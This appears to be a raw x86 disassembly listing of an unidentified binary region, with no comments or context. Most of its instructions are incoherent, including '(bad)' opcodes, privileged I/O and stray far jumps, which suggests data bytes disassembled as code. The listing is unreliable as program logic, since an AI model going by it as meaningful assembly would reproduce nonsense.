  408109:	xor    ah,BYTE PTR ds:0x252a500c
  40810f:	arpl   WORD PTR [ebp+0x0],dx
  408112:	and    eax,0x200352aa
  408117:	test   eax,0xd8200052
  40811c:	dec    esi
  40811d:	add    ah,BYTE PTR [eax]
  40811f:	fisttp WORD PTR [esi+0x5]
  408122:	and    BYTE PTR [edx+0x65],ah
  408125:	sti    
  408126:	push   es
  408127:	sbb    BYTE PTR [ebx+edi*8+0x7],0x82
  40812c:	arpl   bx,di
  40812e:	or     BYTE PTR [edx-0x7df60496],al
  408134:	pop    ecx
  408135:	sti    
  408136:	adc    eax,DWORD PTR [edx+0x12fb58]
  40813c:	sub    BYTE PTR [esi-0x5b81dd06],0xfa
  408143:	and    eax,0x24fa9b42
  408148:	inc    edx
  408149:	mov    dl,0xfa
  40814b:	push   edx
  40814c:	inc    ebx
  40814d:	adc    ebx,edi
  40814f:	push   ebx
  408150:	inc    ebx
  408151:	adc    bl,bh
  408153:	push   esp
  408154:	inc    ebx
  408155:	psubq  mm2,QWORD PTR [ebp+0x43]
  408159:	push   cs
  40815a:	sti    
  40815b:	push   esi
  40815c:	inc    ebx
  40815d:	jne    0x40815a
  40815f:	push   edi
  408160:	inc    ebx
  408161:	ins    BYTE PTR es:[edi],dx
  408162:	sti    
  408163:	pop    eax
  408164:	xor    DWORD PTR [ebx-0x5],0x59
  408168:	sub    DWORD PTR [eax-0x5],0x4
  40816c:	adc    DWORD PTR [edi-0x5],0x11
  408170:	adc    ah,0xfa
  408173:	sub    BYTE PTR [ecx+0x622dfacd],al
  408179:	ret    0x29fa
  40817c:	cmp    edi,0xfc835afa
  408182:	cli    
  408183:	pop    ebx
  408184:	inc    ebx
  408185:	add    eax,0xfa435cfb
  40818a:	cli    
  40818b:	pop    ebp
  40818c:	inc    ebx
  40818d:	or     ebx,edi
  40818f:	and    DWORD PTR [ebx+0x6],eax
  408192:	sti    
  408193:	adc    al,BYTE PTR [esp+edi*8-0x6]
  408197:	sar    BYTE PTR [edi],0xf5
  40819a:	cli    
  40819b:	mov    dh,0x47
  40819d:	fnstenv [ebp-0x2e7ff07]
  4081a3:	scas   al,BYTE PTR es:[edi]
  4081a4:	stc    
  4081a5:	or     al,0xfd
  4081a7:	mov    bh,0xf9
  4081a9:	ins    DWORD PTR es:[edi],dx
  4081aa:	stc    
  4081ab:	mov    eax,0x99f96af9
  4081b0:	stc    
  4081b1:	imul   edi,ecx,0xf95ef99a
  4081b7:	fwait
  4081b8:	stc    
  4081b9:	push   edi
  4081ba:	clc    
  4081bb:	xchg   ebp,eax
  4081bc:	stc    
  4081bd:	jae    0x4081b8
  4081bf:	mov    esi,0xc0f970f9
  4081c4:	stc    
  4081c5:	jle    0x4081c1
  4081c7:	mov    dl,0xf9
  4081c9:	leave  
  4081ca:	cld    
  4081cb:	stos   DWORD PTR es:[edi],eax
  4081cc:	stc    
  4081cd:	int    0xfc
  4081cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081d0:	stc    
  4081d1:	iret   
  4081d2:	cld    
  4081d3:	popf   
  4081d4:	stc    
  4081d5:	lods   al,BYTE PTR ds:[esi]
  4081d6:	cld    
  4081d7:	xchg   esi,eax
  4081d8:	stc    
  4081d9:	(bad)  
  4081da:	cld    
  4081db:	xchg   ecx,edi
  4081dd:	xchg   esp,edi
  4081df:	dec    eax
  4081e0:	stc    
  4081e1:	mov    eax,0xef949fc
  4081e6:	cld    
  4081e7:	dec    edx
  4081e8:	stc    
  4081e9:	adc    ah,bh
  4081eb:	inc    ebx
  4081ec:	stc    
  4081ed:	push   cs
  4081ee:	cld    
  4081ef:	dec    esp
  4081f0:	stc    
  4081f1:	pop    edi
  4081f2:	sti    
  4081f3:	inc    ebp
  4081f4:	stc    
  4081f5:	cmp    ecx,0x4e
  4081f8:	stc    
  4081f9:	or     edi,esp
  4081fb:	aas    
  4081fc:	stc    
  4081fd:	repz sti 
  4081ff:	adc    cl,bh
  408201:	jmp    0x1399401
  408206:	jns    0x408203
  408208:	add    bh,cl
  40820a:	ja     0x408207
  40820c:	sti    
  40820d:	clc    
  40820e:	cmp    bl,0x14
  408211:	stc    
  408212:	jg     0x40820f
  408214:	or     eax,0xfb86f9
  408219:	stc    
  40821a:	cli    
  40821b:	icebp  
  40821c:	and    eax,0x20f1eaf8
  408221:	fnsetpm(287 only) 
  408223:	clc    
  408224:	and    dl,bl
  408226:	fsubr  st(6),st
  408228:	and    eax,0x25ead4dd
  40822d:	aam    0xcc
  40822f:	ret    0xbf26
  408232:	(bad)  
  408233:	les    esp,FWORD PTR [esi]
  408235:	mov    dh,0xbc
  408237:	xchg   edi,eax
  408238:	es mov cl,0xb4
  40823b:	adc    DWORD PTR [edi],esp
  40823d:	mov    al,0xac
  40823f:	jecxz  0x408267
  408241:	mov    ds:0xa221eca4,eax
  408246:	pushf  
  408247:	jmp    0x8c21:0x994951f
  40824e:	mov    edi,gs
  408250:	and    BYTE PTR [edi+0x4a20f384],al
  408256:	jge    0x408265
  408258:	add    DWORD PTR [edi+0x75],ecx
  40825b:	adc    eax,DWORD PTR [ecx]
  40825d:	inc    ecx
  40825e:	ins    DWORD PTR es:[edi],dx
  40825f:	stc    
  408260:	and    dl,BYTE PTR [eax+0x2922fa65]
  408266:	pop    ebp
  408267:	add    BYTE PTR [ecx],0x2b
  40826a:	add    BYTE PTR [ebp+0x76],dl
  40826d:	and    ebp,DWORD PTR [edx]
  40826f:	dec    ebp
  408270:	add    ah,BYTE PTR [ebx]
  408272:	sub    eax,0x2721e345
  408277:	cmp    eax,0x352300b0
  40827c:	jmp    0x666d9fa3
  408281:	and    dh,BYTE PTR [edi]
  408283:	and    eax,0x1d2e237d
  408288:	and    al,0x24
  40828a:	cmp    dl,BYTE PTR ds:0xd3721d9
  408290:	add    esp,DWORD PTR [ebx]
  408292:	add    BYTE PTR [ebx+0x50],al
  408295:	and    DWORD PTR [edx],0x41
  408298:	push   eax
  408299:	and    BYTE PTR [edx],0x4f
  40829c:	push   eax
  40829d:	mov    al,ds:0xa34fff22
  4082a2:	and    bl,BYTE PTR [ecx+ecx*2]
  4082a5:	pop    ss
  4082a6:	and    BYTE PTR [ebx-0x55fa31b8],ch
  4082ac:	dec    eax
  4082ad:	rol    DWORD PTR ds:0x5d04899,1
  4082b3:	cwde   
  4082b4:	dec    eax
  4082b5:	rol    DWORD PTR ds:0x5d248a7,cl
  4082bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082bc:	dec    eax
  4082bd:	aad    0x5
  4082bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082c0:	dec    eax
  4082c1:	aam    0x5
  4082c3:	aam    0x48
  4082c5:	xlat   BYTE PTR ds:[ebx]
  4082c6:	add    eax,0x5d648f3
  4082cb:	loop   0x408315
  4082cd:	fld    DWORD PTR ds:0xd848e100
  4082d3:	add    eax,0x5db48f0
  4082d8:	out    dx,eax
  4082d9:	dec    eax
  4082da:	fiadd  DWORD PTR ds:0x5dd48de
  4082e0:	in     eax,dx
  4082e1:	inc    edi
  4082e2:	fadd   QWORD PTR ds:0x5df480c
  4082e8:	mov    ebx,0xba05de48
  4082ed:	dec    eax
  4082ee:	loope  0x4082f5
  4082f0:	test   eax,0x8805e048
  4082f5:	dec    eax
  4082f6:	jecxz  0x4082fd
  4082f8:	ja     0x408342
  4082fa:	loop   0x408301
  4082fc:	jbe    0x408346
  4082fe:	in     eax,0x5
  408300:	jne    0x40834a
  408302:	in     al,0x5
  408304:	inc    esp
  408305:	dec    eax
  408306:	out    0x5,eax
  408308:	inc    ebx
  408309:	dec    eax
  40830a:	out    0x5,al
  40830c:	(bad)  
  40830d:	jmp    0xeca86c07
  408312:	cmc    
  408313:	jmp    0x1392477
  408318:	ins    BYTE PTR es:[edi],dx
  408319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40831a:	clc    
  40831b:	add    DWORD PTR [ebx+eiz*4-0x8],esp
  40831f:	add    bl,BYTE PTR [esi+edx*4-0x8]
  408323:	add    edx,DWORD PTR [ebp+ebx*2-0xa]
  408327:	add    al,0x6c
  408329:	pop    eax
  40832a:	test   BYTE PTR ds:0x6f65f64,0x5c
  408331:	pop    edx
  408332:	test   BYTE PTR [edi],0x0
  408335:	push   esp
  408336:	imul   esi,esi,0xf66c6c08
  40833c:	or     DWORD PTR [ebx+ebx*2-0xa],esp
  408340:	or     bl,BYTE PTR [esi+ecx*8-0xb]
  408344:	or     edx,DWORD PTR [ebp+eiz*4-0xb]
  408348:	or     al,0x6c
  40834a:	mov    al,ds:0x97640df5
  40834f:	cmc    
  408350:	push   cs
  408351:	pop    esp
  408352:	mov    dl,0xf5
  408354:	andps  xmm2,XMMWORD PTR [ecx]
  408357:	not    BYTE PTR [eax]
  408359:	ins    BYTE PTR es:[edi],dx
  40835a:	adc    al,0xf6
  40835c:	adc    DWORD PTR [ebx+edx*1-0xa],esp
  408360:	adc    bl,BYTE PTR [esi+eax*1-0xa]
  408364:	adc    edx,DWORD PTR [ebp+ebp*2-0xa]
  408368:	adc    al,0x6c
  40836a:	data16 not BYTE PTR ds:0x16f66f64
  408371:	pop    esp
  408372:	push   0x595417f6
  408377:	neg    BYTE PTR [eax]
  408379:	ins    BYTE PTR es:[edi],dx
  40837a:	pop    edx
  40837b:	neg    BYTE PTR [ecx]
  40837d:	fs retf 
  40837f:	cmc    
  408380:	sbb    bl,BYTE PTR [esp+edi*4-0xb]
  408384:	sbb    edx,DWORD PTR [ecx+ebx*8+0x64]
  408388:	idiv   DWORD PTR [esi-0x21]
  40838b:	pop    ebp
  40838c:	div    DWORD PTR [edi-0x21]
  40838f:	push   esi
  408390:	imul   DWORD PTR [edi+ebx*8+0x27]
  408394:	mul    DWORD PTR [ebp-0x21]
  408397:	sub    bh,dh
  408399:	add    BYTE PTR [edx-0x21],al
  40839c:	sub    edi,esi
  40839e:	inc    ebx
  40839f:	fild   QWORD PTR [edx]
  4083a1:	test   DWORD PTR [eax-0x21],0xdf41f723
  4083a8:	lods   al,BYTE PTR ds:[esi]
  4083a9:	test   BYTE PTR [esi+0x7ff6a5df],0xdf
  4083b0:	scas   al,BYTE PTR es:[edi]
  4083b1:	test   BYTE PTR [edi+ebx*8-0x20820961],0xb0
  4083b9:	test   BYTE PTR [edx-0x74094e21],0xdf
  4083c0:	mov    ds:0x9bdf78f6,al
  4083c5:	idiv   BYTE PTR [ecx-0x21]
  4083c8:	mov    ah,0xf6
  4083ca:	dec    esi
  4083cb:	fild   QWORD PTR [ebp-0x5920b80a]
  4083d1:	idiv   BYTE PTR [edi+ebx*8]
  4083d4:	mov    bh,0xf6
  4083d6:	xor    eax,0x32f698df
  4083db:	fistp  WORD PTR [ecx-0x6520cc0a]
  4083e1:	div    BYTE PTR [eax]
  4083e3:	fist   WORD PTR [ebx+0x3cdf31f6]
  4083e9:	not    BYTE PTR [esi-0x7009ca21]
  4083ef:	fistp  QWORD PTR [esi]
  4083f1:	not    BYTE PTR [edi+ebx*8-0x207209d1]
  4083f8:	and    dh,dh
  4083fa:	jp     0x4083db
  4083fc:	and    esi,esi
  4083fe:	add    BYTE PTR [ebx-0x21],bh
  408401:	add    BYTE PTR [edi],dl
  408403:	xor    al,0xc
  408405:	femms  
  408407:	sub    al,0xf
  408409:	wbinvd 
  40840b:	adc    al,0xe
  40840d:	invd   
  40840f:	or     al,0x99
  408411:	push   cs
  408412:	or     edx,DWORD PTR [eax+ebx*4]
  408415:	push   cs
  408416:	or     cl,BYTE PTR [ebx+ebx*4]
  408419:	push   cs
  40841a:	or     eax,0x40e99f4
  40841f:	in     al,dx
  408420:	xchg   esp,eax
  408421:	push   cs
  408422:	pmuludq mm2,QWORD PTR [ebx-0x6913f9f2]
  408429:	push   cs
  40842a:	rcr    ebx,1
  40842c:	xchg   ebp,eax
  40842d:	push   cs
  40842e:	rcr    bl,1
  408430:	mov    al,ds:0x9fcbc30e
  408435:	push   cs
  408436:	ret    0xa2cb
  408439:	push   cs
  40843a:	aad    0xbb
  40843c:	mov    eax,ds:0x9cbbcc0e
  408441:	push   cs
  408442:	mov    ecx,0xb80e9dab
  408447:	stos   DWORD PTR es:[edi],eax
  408448:	test   al,0xe
  40844a:	fwait
  40844b:	fwait
  40844c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40844d:	push   cs
  40844e:	call   0xa98b:0x9d0eaa9b
  408455:	push   cs
  408456:	xchg   esp,eax
  408457:	mov    esp,DWORD PTR [esi+ecx*1+0xea37b7f]
  40845e:	jbe    0x4084db
  408460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408461:	push   cs
  408462:	jno    0x408464
  408464:	imul   esp,DWORD PTR [ebp-0x4f948ff2],0xe
  40846b:	mov    BYTE PTR [edx+ecx*1+0x30],dl
  40846f:	mov    ecx,DWORD PTR [ebx+ecx*1+0x30]
  408473:	mov    dl,BYTE PTR [eax+ecx*1+0x30]
  408477:	test   DWORD PTR [ecx+ecx*1+0x30],ecx
  40847b:	add    dh,ch
  40847d:	inc    ebx
  40847e:	xor    eax,0x3443dd31
  408483:	xor    esp,ebx
  408485:	inc    ebx
  408486:	aaa    
  408487:	xor    ebx,esp
  408489:	inc    ebx
  40848a:	xor    DWORD PTR ss:[edx-0x4ecec6bd],esi
  408491:	inc    ebx
  408492:	cmp    BYTE PTR [ecx],dh
  408494:	mov    al,ds:0x47313b43
  408499:	inc    ebx
  40849a:	cmp    dh,BYTE PTR [ecx]
  40849c:	xchg   esi,eax
  40849d:	inc    ebx
  40849e:	cmp    eax,0x3c43a531
  4084a3:	xor    DWORD PTR [ebx+eax*2+0x432b313f],esp
  4084aa:	ds xor edx,edi
  4084ad:	inc    esi
  4084ae:	inc    ecx
  4084af:	xor    ecx,edi
  4084b1:	inc    esi
  4084b2:	inc    eax
  4084b3:	xor    eax,ebp
  4084b5:	inc    esi
  4084b6:	inc    ebx
  4084b7:	xor    edi,ebp
  4084b9:	inc    esi
  4084ba:	inc    edx
  4084bb:	xor    DWORD PTR [esi],edi
  4084bd:	inc    esi
  4084be:	inc    ebp
  4084bf:	xor    DWORD PTR ds:0x2c314446,ebp
  4084c5:	inc    esi
  4084c6:	inc    edi
  4084c7:	xor    DWORD PTR [eax],eax
  4084c9:	xor    eax,DWORD PTR [esi+0x46]
  4084cc:	xor    DWORD PTR [edx],eax
  4084ce:	inc    esi
  4084cf:	dec    ecx
  4084d0:	xor    DWORD PTR [ecx],eax
  4084d2:	inc    esi
  4084d3:	dec    eax
  4084d4:	xor    DWORD PTR [eax],esi
  4084d6:	inc    esi
  4084d7:	dec    ebx
  4084d8:	xor    DWORD PTR [edi],edx
  4084da:	inc    esi
  4084db:	dec    edx
  4084dc:	xor    DWORD PTR [esi],esp
  4084de:	inc    esi
  4084df:	dec    ebp
  4084e0:	xor    DWORD PTR ds:0x34314c46,esi
  4084e6:	inc    esi
  4084e7:	dec    edi
  4084e8:	xor    DWORD PTR [ebx-0x75ceb1ba],edi
  4084ee:	inc    esi
  4084ef:	push   ecx
  4084f0:	xor    DWORD PTR [ecx+0x62315046],ecx
  4084f6:	push   ebx
  4084f8:	push   edx
  4084f9:	xchg   ebx,eax
  4084fa:	div    bl
  4084fc:	push   ebx
  4084fd:	jae    0x4084fc
  4084ff:	repz push esp
  408501:	jae    0x4084f7
  408503:	repz push ebp
  408505:	jae    0x408502
  408507:	repz push esi
  408509:	jae    0x408505
  40850b:	repz push edi
  40850d:	push   ebx
  40850e:	or     esp,esi
  408510:	pop    eax
  408511:	push   ebx
  408512:	or     ah,dh
  408514:	pop    ecx
  408515:	push   ebx
  408516:	div    ebx
  408518:	pop    edx
  408519:	push   ebx
  40851a:	out    dx,al
  40851b:	repz pop ebx
  40851d:	xor    eax,DWORD PTR ds:0xfc335cf4
  408523:	repz pop ebp
  408525:	xor    esi,ebx
  408527:	repz pop esi
  408529:	xor    esi,edx
  40852b:	repz pop edi
  40852d:	add    BYTE PTR [ebx-0x6c9f086f],dl
  408533:	nop
  408534:	mul    DWORD PTR [ecx-0x6d]
  408537:	(bad)  
  408538:	mul    DWORD PTR [edx-0x6d]
  40853b:	xchg   bh,dh
  40853d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40853e:	push   ebx
  40853f:	ins    DWORD PTR es:[edi],dx
  408540:	imul   DWORD PTR [eax-0x56089bad]
  408546:	push   ebx
  408547:	imul   esi,edi,0xffffffaa
  40854a:	push   ebx
  40854b:	push   0xfffffff7
  40854d:	stos   DWORD PTR es:[edi],eax
  40854e:	jae    0x408569
  408550:	imul   DWORD PTR [ebx+esi*2+0x73adf718]
  408557:	xchg   edi,esi
  408559:	scas   al,BYTE PTR es:[edi]
  40855a:	jae    0x4085da
  40855c:	imul   DWORD PTR [edi-0x4f088aad]
  408562:	push   ebx
  408563:	ins    BYTE PTR es:[edi],dx
  408564:	div    DWORD PTR [ecx-0x4d089cad]
  40856a:	push   ebx
  40856b:	(bad)  
  40856c:	div    DWORD PTR [ebx-0x9b7268d]
  408572:	push   cs
  408573:	jmp    0xe9587bc1
  408578:	dec    edx
  408579:	test   BYTE PTR [ecx+ebp*8],0x43
  40857d:	div    ch
  40857f:	call   0xe93b7bd0
  408584:	inc    ebp
  408585:	imul   bl
  408587:	call   0xe9297bda
  40858c:	aas    
  40858d:	neg    cl
  40858f:	call   0xd6417ba4
  408594:	call   0xe9107baa
  408599:	add    dh,dh
  40859b:	(bad)  
  40859c:	call   0xe8fe7b9c
  4085a1:	adc    al,0xf6
  4085a3:	and    ch,cl
  4085a5:	or     eax,0x6e923f6
  4085aa:	div    BYTE PTR [esi+0x8]
  4085ad:	clc    
  4085ae:	cmc    
  4085af:	push   edx
  4085b0:	or     cl,bl
  4085b2:	cmc    
  4085b3:	dec    ebp
  4085b4:	or     dl,bl
  4085b6:	cmc    
  4085b7:	dec    esp
  4085b8:	or     bl,bl
  4085ba:	cmc    
  4085bb:	loop   0x4085c5
  4085bd:	aam    0xf5
  4085bf:	loope  0x4085c9
  4085c1:	mov    ebp,0xb608dff5
  4085c6:	cmc    
  4085c7:	fimul  WORD PTR [eax]
  4085c9:	mov    edi,0xb008d7f5
  4085ce:	cmc    
  4085cf:	mov    al,ch
  4085d1:	mov    al,ds:0xa1e885f5
  4085d6:	cmc    
  4085d7:	mov    ch,al
  4085d9:	xchg   esi,eax
  4085da:	cmc    
  4085db:	mov    edx,0xce1043f9
  4085e0:	stc    
  4085e1:	inc    ebx
  4085e2:	adc    BYTE PTR [eax],dl
  4085e4:	fdivr  DWORD PTR [eax+edx*1]
  4085e7:	adc    eax,ebx
  4085e9:	add    BYTE PTR [edi],dh
  4085eb:	push   edx
  4085ec:	sar    edi,1
  4085ee:	dec    eax
  4085ef:	inc    ecx
  4085f0:	push   0x21
  4085f2:	mov    BYTE PTR [ecx+0x79],al
  4085f5:	and    DWORD PTR [ebx+0x21784100],ecx
  4085fb:	mov    al,BYTE PTR [ecx+0x77]
  4085fe:	and    DWORD PTR [ebp-0x73de89bf],eax
  408604:	inc    ecx
  408605:	jne    0x408628
  408607:	xchg   DWORD PTR [ecx+0x74],eax
  40860a:	and    DWORD PTR [esi-0x7ede8cbf],ecx
  408610:	add    DWORD PTR [edx+0x21],esi
  408613:	push   eax
  408614:	add    DWORD PTR [ecx-0x7ffeacdf],eax
  40861a:	and    DWORD PTR [edx+0x1],eax
  40861d:	jg     0x408640
  40861f:	cmp    eax,0xe9217e01
  408624:	pusha  
  408625:	xlat   BYTE PTR ds:[ebx]
  408626:	add    ebp,esp
  408628:	in     al,dx
  408629:	rol    DWORD PTR ds:0x9dfe8e1,cl
  40862f:	fst    st(4)
  408631:	fisttp DWORD PTR ds:0x11e7cef9
  408637:	cmc    
  408638:	retf   0x15e3
  40863b:	icebp  
  40863c:	(bad)  
  40863d:	out    dx,eax
  40863e:	sbb    ebp,ebp
  408640:	(bad)  
  408641:	jmp    0x408660
  408643:	or     DWORD PTR [edi-0x44fade09],edi
  408649:	repz and eax,0x29ffb701
  40864f:	std    
  408650:	xchg   edx,eax
  408651:	sti    
  408652:	sub    eax,0x3207aed9
  408657:	aad    0xaa
  408659:	add    esi,DWORD PTR [esi]
  40865b:	rol    DWORD PTR [eax],1
  40865d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40865e:	(bad)  
  408661:	or     BYTE PTR [ebx],0x3e
  408664:	add    BYTE PTR [ebx+0x74],cl
  408667:	pusha  
  408668:	arpl   WORD PTR [edi-0x80],sp
  40866b:	arpl   WORD PTR fs:[si+0x68],di
  408670:	imul   ebx,DWORD PTR [edi-0x76],0x6c
  408674:	outs   dx,DWORD PTR ds:[esi]
  408675:	cmp    ebp,DWORD PTR [esi+0x70]
  408678:	jae    0x4086b1
  40867a:	bound  esi,QWORD PTR [edi+esi*2+0x33]
  40867e:	data16 js 0x4086dc
  408681:	bndldx bnd3,[edi+ebx*2+0x2b]
  408686:	jle    0x4086e8
  408688:	arpl   WORD PTR [edi],sp
  40868a:	jb     0x4086f0
  40868c:	and    esi,DWORD PTR [bp+0x68]
  408690:	imul   ebx,edi,0xffffff89
  408693:	ins    BYTE PTR es:[edi],dx
  408694:	outs   dx,DWORD PTR ds:[esi]
  408695:	sti    
  408696:	ins    DWORD PTR es:[edi],dx
  408697:	jo     0x40870c
  408699:	mul    DWORD PTR [ecx+0x74]
  40869c:	ja     0x408691
  40869e:	gs js  0x40871c
  4086a1:	out    dx,eax
  4086a2:	jns    0x408720
  4086a4:	jg     0x408631
  4086a6:	pop    esi
  4086a7:	add    DWORD PTR [ebx-0x7878ad79],0xffffff83
  4086ae:	push   esi
  4086af:	mov    ecx,DWORD PTR [ebx-0x707095c1]
  4086b5:	pop    ebx
  4086b6:	int    0x92
  4086b8:	xchg   ebx,eax
  4086b9:	push   edi
  4086ba:	rcl    DWORD PTR [esi-0x653aac69],0x9b
  4086c1:	add    BYTE PTR [edi+0x59],cl
  4086c4:	lahf   
  4086c5:	lahf   
  4086c6:	jmp    0x408685
  4086c8:	mov    ds:0xa6b1e7a3,al
  4086cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086ce:	jecxz  0x408685
  4086d0:	stos   BYTE PTR es:[edi],al
  4086d1:	stos   DWORD PTR es:[edi],eax
  4086d2:	pop    ds
  4086d3:	leave  
  4086d4:	scas   al,BYTE PTR es:[edi]
  4086d5:	scas   eax,DWORD PTR es:[edi]
  4086d6:	cmp    ebp,DWORD PTR [ebp-0x5ec84c4e]
  4086dc:	mov    dh,0xb7
  4086de:	bound  ebp,QWORD PTR [edx-0x694645a4]
  4086e4:	pusha  
  4086e5:	mov    esi,0xc24572b5
  4086ea:	mov    eax,ds:0x9dc6497e
  4086ef:	jp     0x40873e
  4086f1:	retf   0x6629
  4086f4:	push   ecx
  4086f5:	into   
  4086f6:	and    eax,0x31d23502
  4086fb:	push   cs
  4086fc:	cmp    esi,edx
  4086fe:	sub    eax,0x19da3d0a
  408703:	test   BYTE PTR [eax-0x22],0x15
  408707:	xchg   edx,eax
  408708:	and    al,0xe2
  40870a:	inc    ecx
  40870b:	sahf   
  40870c:	sub    dh,ah
  40870e:	cmp    eax,0x9ea2c9a
  408713:	push   es
  408714:	xor    esi,ebp
  408716:	add    eax,0x11f214e2
  40871b:	out    dx,al
  40871c:	sbb    dh,dh
  40871e:	or     eax,0xf9fa1cea
  408723:	aad    0x20
  408725:	inc    BYTE PTR [eax]
  408727:	cmc    
  408728:	xor    DWORD PTR ds:0x93e6102,eax
  40872e:	push   es
  40872f:	pop    ebp
  408730:	cmp    cl,BYTE PTR ds:0x1126690a
  408736:	push   cs
  408737:	gs inc edx
  408739:	repz adc DWORD PTR [ecx+0x4e],esi
  40873d:	not    DWORD PTR ds:0x19fb4a6d
  408743:	pop    ecx
  408744:	call   FWORD PTR ss:0x21e1d255
  40874b:	sbb    esi,0xda7d25e5
  408751:	jmp    0xef86d07f
  408756:	sub    eax,0xd2d7d945
  40875b:	push   ebx
  40875c:	or     al,0xd4
  40875e:	(bad)  
  40875f:	dec    edi
  408760:	adc    al,dl
  408762:	fidivr DWORD PTR [ebx]
  408764:	add    al,0xcc
  408766:	fidiv  WORD PTR [edi]
  408768:	or     BYTE PTR [eax],ch
  40876a:	mov    ds:0xa703bc03,eax
  40876f:	(bad)  
  408770:	mov    edi,0xb2cbaaff
  408775:	sti    
  408776:	scas   al,BYTE PTR es:[edi]
  408777:	(bad)  
  408778:	mov    dh,0xd7
  40877a:	xchg   edx,eax
  40877b:	ror    edx,cl
  40877d:	rcl    DWORD PTR [esi-0x65303131],cl
  408783:	mov    ebx,0x97beaba2
  408788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408789:	mov    edx,0xa39aa300
  40878f:	(bad)  
  408790:	lahf   
  408791:	sahf   
  408792:	lahf   
  408793:	retf   0x92ab
  408796:	fwait
  408797:	into   
  408798:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408799:	xchg   esi,eax
  40879a:	mov    bh,0xb2
  40879c:	mov    bl,0xaa
  40879e:	mov    bl,0xb6
  4087a0:	scas   eax,DWORD PTR es:[edi]
  4087a1:	scas   al,BYTE PTR es:[edi]
  4087a2:	scas   eax,DWORD PTR es:[edi]
  4087a3:	mov    edx,0x9e8bc29b
  4087a8:	ja     0x408770
  4087aa:	addr16 and eax,0x5a
  4087ae:	fs xchg esp,ebx
  4087b1:	pop    esi
  4087b2:	pusha  
  4087b3:	mov    ebp,eax
  4087b5:	push   edx
  4087b6:	pop    esp
  4087b7:	(bad)  
  4087b8:	in     al,0x56
  4087ba:	js     0x40882e
  4087bc:	lock push 0x74
  4087bf:	jbe    0x4087ad
  4087c1:	outs   dx,BYTE PTR ds:[esi]
  4087c2:	jo     0x40883e
  4087c4:	fsub   DWORD PTR [edx+0x6c]
  4087c7:	jle    0x40879d
  4087c9:	data16 mov BYTE PTR [edx+0x0],ah
  4087cd:	jnp    0x408753
  4087cf:	data16 cld 
  4087d1:	jle    0x4087d4
  4087d3:	or     DWORD PTR [eax],0x47daa73
  4087d9:	ja     0x408789
  4087db:	pop    ecx
  4087dc:	xor    BYTE PTR [ebx-0x70d3aa4e],cl
  4087e2:	mov    dh,0x51
  4087e4:	sbb    BYTE PTR [ebx-0x78ebb246],al
  4087ea:	mov    esi,0xc21b20a9
  4087ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087f0:	add    BYTE PTR [edi+ebx*1],bl
  4087f3:	(bad)  
  4087f4:	mov    eax,ds:0x9dca13a8
  4087f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087fa:	pop    ss
  4087fb:	into   
  4087fc:	cmp    DWORD PTR [eax-0x73ca2dd5],edx
  408802:	das    
  408803:	(bad)  
  408804:	xor    DWORD PTR [eax+0x23],edi
  408807:	fisubr DWORD PTR ds:0x49de2774
  40880d:	cmp    BYTE PTR [ebx],0xe2
  408810:	inc    ebp
  408811:	jl     0x408852
  408813:	out    0x41,al
  408815:	dec    eax
  408816:	xor    ebp,edx
  408818:	cmp    eax,0x19ee3744
  40881d:	jo     0x40886a
  40881f:	repnz adc eax,0x11f64f6c
  408825:	pop    eax
  408826:	inc    ebx
  408827:	cli    
  408828:	or     eax,0xe9fe4754
  40882d:	add    eax,DWORD PTR [esi-0x2]
  408830:	call   0xe9416196
  408835:	popa   
  408836:	fld    DWORD PTR [eax]
  408838:	jmp    0xe941619e
  40883d:	popa   
  40883e:	fld    DWORD PTR [eax]
  408840:	jmp    0xe94161a6
  408845:	popa   
  408846:	fld    DWORD PTR [eax]
  408848:	jmp    0x4161ae
  40884d:	mov    ebx,0xbb0000d9
  408852:	fscale 
  408854:	add    eax,DWORD PTR [eax]
  408856:	push   ebp
  408857:	fld    QWORD PTR [eax]
  408859:	add    BYTE PTR [ebp-0x23],al
  40885c:	add    BYTE PTR [eax],al
  40885e:	jnp    0x408839
  408860:	add    BYTE PTR [eax],al
  408862:	jnp    0x40883d
  408864:	add    BYTE PTR [eax],al
  408866:	mov    ebx,ecx
  408868:	add    BYTE PTR [eax],al
  40886a:	mov    ebx,ecx
  40886c:	add    BYTE PTR [eax],al
  40886e:	jnp    0x408849
  408870:	add    BYTE PTR [eax],al
  408872:	jnp    0x40884d
  408874:	std    
  408875:	add    ecx,DWORD PTR [ebx-0x27]
  408878:	add    BYTE PTR [eax],al
  40887a:	dec    ebx
  40887b:	fld    DWORD PTR [eax]
  40887d:	add    BYTE PTR [ebx],bh
  40887f:	fld    DWORD PTR [eax]
  408881:	add    BYTE PTR [ebx],bh
  408883:	fld    DWORD PTR [eax]
  408885:	add    BYTE PTR [ebx-0x27],cl
  408888:	add    BYTE PTR [eax],al
  40888a:	dec    ebx
  40888b:	fld    DWORD PTR [eax]
  40888d:	add    BYTE PTR [ebx],bh
  40888f:	fld    DWORD PTR [eax]
  408891:	add    BYTE PTR [ebx],bh
  408893:	fld    DWORD PTR [eax]
  408895:	add    BYTE PTR [ebp-0x1c],dl
  408898:	std    
  408899:	pop    es
  40889a:	or     ebx,ecx
  40889c:	add    BYTE PTR [eax],al
  40889e:	sti    
  40889f:	fadd   DWORD PTR [eax]
  4088a1:	add    bl,bh
  4088a3:	fadd   DWORD PTR [eax]
  4088a5:	add    BYTE PTR [ebx],cl
  4088a7:	fld    DWORD PTR [eax]
  4088a9:	add    BYTE PTR [ebx],cl
  4088ab:	fld    DWORD PTR [eax]
  4088ad:	add    bl,bh
  4088af:	fadd   DWORD PTR [eax]
  4088b1:	add    bl,bh
  4088b3:	fadd   DWORD PTR [eax]
  4088b5:	add    bl,cl
  4088b7:	fadd   DWORD PTR [eax]
  4088b9:	add    BYTE PTR [eax],al
